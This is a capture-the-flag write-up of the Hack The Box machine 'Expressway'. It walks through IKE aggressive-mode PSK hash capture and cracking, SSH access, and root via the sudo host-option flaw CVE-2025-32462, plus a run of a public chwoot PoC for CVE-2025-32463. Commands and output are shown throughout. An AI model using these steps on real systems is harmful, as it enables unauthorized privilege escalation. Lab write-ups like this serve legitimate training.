---
title: Expressway
layout: post
released: 2025-09-21
creators: dakkmaddy
pwned: true
tags:
  - boxes
  - os/linux
  - diff/easy
category:
  - HTB
description: Expressway is running isakmp on port 500 UDP, which allows us to retrieve a user and a psk hash which can be cracked to retrieve a password. We then ssh into the target using these credentials and find a vulnerable sudo version and a host which could be configured in the sudoers file. Abusing the host-any privilege we can escalate to root.
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/75c168f01f04e5f256838733b77f13ec.png
cssclasses:
  - custom_htb
---
![Expressway Token](https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/75c168f01f04e5f256838733b77f13ec.png)

# Enumeration
## Scans
As usual we start off with an `nmap` scan.
```
PORT   STATE SERVICE
22/tcp open  ssh
```

Since we only have an `ssh` port open, let's scan `UDP`
```
PORT      STATE  SERVICE REASON              VERSION
500/udp   open   isakmp? udp-response ttl 63
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0
35921/udp closed unknown port-unreach ttl 63
53798/udp closed unknown port-unreach ttl 63
```
# User
## isakmp
> ISAKMP (Internet Security Association and Key Management Protoc) is a framework, defined in RFC 2408, that establishes security associations (SAs) and cryptographic keys between two peers to create secure communication channels, commonly for IPsec VPNs
{:.info}

Let's start off by doing an `ike-scan`
```
$ ike-scan -A expressway.htb          
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.172.1    Aggressive Mode Handshake returned HDR=(CKY-R=6088631414f8bea7) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)
Ending ike-scan 1.9.6: 1 hosts scanned in 0.299 seconds (3.34 hosts/sec).  1 returned handshake; 0 returned notify
```

We've found an identity `ike@expressway.htb` and that the authentication mechanism is `Pre-Shared Key(psk)`, let's retrieve the `psk hash`
```
$ ike-scan -A --pskcrack expressway.htb 
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.172.1    Aggressive Mode Handshake returned HDR=(CKY-R=f1d9c3a244505b39) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
7bc[REDACTED]
Ending ike-scan 1.9.6: 1 hosts scanned in 0.300 seconds (3.33 hosts/sec).  1 returned handshake; 0 returned notify
```

## ike
Let's crack this hash using `hashcat`
```
$ hashcat -a 0 psk.txt /usr/share/wordlists/rockyou.txt
<SNIP>
7bc[REDACTED]:fr[REDACTED]
</SNIP>
```

We can then reuse these credentials to `ssh` onto the box.

Just like that, we have User!
# Root
Looking around we can see that we're a member of the `proxy` group
```
ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
```

Let's find out what directories and files we can access
```
ike@expressway:~$ find / -group proxy 2>/dev/null
/run/squid
/var/spool/squid
/var/spool/squid/netdb.state
/var/log/squid
/var/log/squid/cache.log.2.gz
/var/log/squid/access.log.2.gz
/var/log/squid/cache.log.1
/var/log/squid/access.log.1
```

We can find that we have access to several files in `/var/log/squid`. Taking a look around the most interesting line is the following in `/var/log/squid/access.log.1`
```
1753229688.902 0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
```

This provides us with a subdomain which is potentially a host: `offramp.expressway.htb`. Looking at the `sudo` version we notice that it's out of date.
```
ike@expressway:~$ sudo --version
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

One of the vulnerabilities in this version is [CVE-2025-32462](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-32462) which we can read more about in this [advisory](https://www.sudo.ws/security/advisories/host_any/). Let's run `sudo -l` against the `offramp.expressway.htb` host.
```
ike@expressway:~$ sudo -l -h offramp.expressway.htb 
Matching Defaults entries for ike on offramp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ike may run the following commands on offramp:
    (root) NOPASSWD: ALL
    (root) NOPASSWD: ALL
```

We find that we have root permissions without requiring a password when connecting to this host. Let's use `su` to swap to root.
```
ike@expressway:~$ sudo -h offramp.expressway.htb su
root@expressway:/home/ike# ls /root
root.txt
```
Just like that, we have Root!

# Beyond Root
## Sudoers
The `host-any` privilege escalation vector only exists if the `sudoers` file is configured with that specific host. Let's take a look at the `sudoers` file.
```
# Host alias specification
Host_Alias     SERVERS        = expressway.htb, offramp.expressway.htb
Host_Alias     PROD           = expressway.htb
ike            SERVERS, !PROD = NOPASSWD:ALL
ike         offramp.expressway.htb  = NOPASSWD:ALL
```

We can see that the host `offramp.expressway.htb` has the configuration of `NOPASSWD:ALL`, noticeably the second line for the `ike` user is redundant as the first line should already provide us with the required permissions as `SERVERS` contains the `offramp.expressway.htb` host.

## Chwoot
Other than the `host-alias` privilege escalation vector, we can instead exploit another vulnerability in the same `sudo` version. We can use the following [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/tree/main).
```
ike@expressway:/tmp$ ./sudo-chwoot.sh 
woot!
root@expressway:/#
```

This was actually what was first found by my team and it seems most everyone else as  it's one of the more well known exploits as it's been talked about a lot recently.
